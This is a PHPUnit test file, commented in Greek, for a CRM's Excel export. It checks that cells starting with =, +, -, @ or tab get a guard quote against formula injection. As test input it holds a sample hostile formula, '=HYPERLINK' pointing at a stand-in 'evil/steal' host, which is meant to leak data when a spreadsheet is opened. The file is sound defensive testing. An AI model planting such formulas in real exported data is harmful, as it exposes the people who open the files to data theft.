<?php

/**
 * Άμυνα κατά formula/CSV injection στην εξαγωγή Excel.
 *
 * Το `sheet_xml()` γράφει δεδομένα πελάτη (όνομα, επωνυμία, κινητό) απευθείας
 * σε κελιά inline string. Μέχρι τις 26/08/2026 δεν υπήρχε καμία άμυνα: ένας
 * πελάτης ή συνεργάτης που έβαζε όνομα `=HYPERLINK(...)` έκανε τον
 * διαχειριστή που ανοίγει το εξαγόμενο .xlsx να ανοίξει έναν «ζωντανό»
 * τύπο/σύνδεσμο -- δυνητική διαρροή δεδομένων. Η άμυνα (`guard_formula()`)
 * είναι η καθιερωμένη OWASP μέθοδος: ένα αρχικό `'` πριν από κελιά που
 * ξεκινούν με `= + - @` ή tab/CR, πριν το XML-escaping.
 *
 * Το τεστ ανοίγει πραγματικά το παραγόμενο .xlsx (ZipArchive) και διαβάζει
 * το sheet1.xml -- όχι μόνο ότι μια private μέθοδος επιστρέφει κάτι, αλλά ότι
 * αυτό που καταλήγει στο αρχείο που θα ανοίξει ο χρήστης είναι ασφαλές.
 *
 * @package EnergyCRM
 */

declare(strict_types=1);

namespace EnergyCRM\Tests\Integration;

use ECRM_Export;
use PHPUnit\Framework\Attributes\DataProvider;
use ZipArchive;

final class ExportFormulaGuardTest extends IntegrationTestCase
{
    public function testACellStartingWithEqualsGetsAGuardQuote(): void
    {
        $sheet = $this->sheetXmlOf(['=HYPERLINK("http://evil/steal","open")']);

        self::assertStringContainsString('&apos;=HYPERLINK', $sheet);
    }

    /** @return array<string, array{0: string}> */
    public static function dangerousLeadingCharsProvider(): array
    {
        return [
            'equals'   => ['=cmd'],
            'plus'     => ['+cmd'],
            'minus'    => ['-cmd'],
            'at'       => ['@cmd'],
            'tab'      => ["\tcmd"],
        ];
    }

    #[DataProvider('dangerousLeadingCharsProvider')]
    public function testEveryDangerousLeadingCharacterIsGuarded(string $value): void
    {
        $sheet = $this->sheetXmlOf([$value]);

        // Το πρώτο byte μέσα στο <t> πρέπει να είναι το guard quote, όχι ο
        // επικίνδυνος χαρακτήρας -- ελέγχεται η θέση, όχι απλώς η παρουσία.
        self::assertMatchesRegularExpression(
            '/<t[^>]*>&apos;/',
            $sheet,
            'Η τιμή "' . $value . '" έπρεπε να ξεκινά με το guard quote στο κελί της.'
        );
    }

    /** Ένα κανονικό όνομα δεν πειράζεται. */
    public function testAnOrdinaryNameIsUntouched(): void
    {
        $sheet = $this->sheetXmlOf(['Γιώργος Παπαδόπουλος']);

        self::assertStringContainsString('Γιώργος Παπαδόπουλος', $sheet);
        self::assertStringNotContainsString('&apos;Γιώργος', $sheet);
    }

    /** Ένα κενό κελί δεν γίνεται μονοψήφιο απόστροφο. */
    public function testAnEmptyCellStaysEmpty(): void
    {
        $sheet = $this->sheetXmlOf(['']);

        self::assertStringNotContainsString('&apos;', $sheet);
    }

    private function sheetXmlOf(array $row): string
    {
        $bytes = ECRM_Export::build_xlsx(['Στήλη'], [$row]);

        $tmp = tempnam(sys_get_temp_dir(), 'ecrm_xlsx_test_');
        self::assertNotFalse($tmp);
        file_put_contents($tmp, $bytes);

        $zip = new ZipArchive();
        self::assertTrue($zip->open($tmp) === true);
        $sheet = $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        unlink($tmp);

        self::assertIsString($sheet, 'sheet1.xml was not found inside the exported .xlsx.');

        return $sheet;
    }
}
